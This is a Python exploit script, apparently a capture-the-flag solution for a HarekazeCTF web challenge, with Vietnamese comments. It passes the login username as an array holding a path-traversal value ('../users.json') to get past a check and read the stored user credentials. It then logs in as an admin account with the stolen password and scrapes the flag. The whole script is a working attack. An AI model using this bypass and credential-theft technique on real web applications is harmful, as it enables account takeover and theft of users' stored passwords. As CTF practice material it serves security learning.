import json
import os
import re
import requests

url = "http://127.0.0.1/"
session = requests.Session()
session.post(url + 'login', headers={
    'Content-Type': 'application/json'
}, data=json.dumps({
    'username': ['../users.json'],  # Đưa vào danh sách (array) để bypass kiểm tra
    'password': None
}))
response = session.get(url + 'myavatar.png')
data = response.json()
username = password = None
for u, p in data.items():
    if u.startswith('admin'):
        username = u
        password = p
        break
if not username:
    print("[-] Không tìm thấy tài khoản admin!")
    exit()
session.post(url + 'login', headers={
    'Content-Type': 'application/json'
}, data=json.dumps({
    'username': username,
    'password': password
}))

response = session.get(url + 'admin')
match = re.search(r'HarekazeCTF\{.*?\}', response.text)
if match:
    flag = match.group(0)
    print(f"[+] Here is the flag:\n{flag}")
else:
    print("[-] Không tìm thấy flag.")
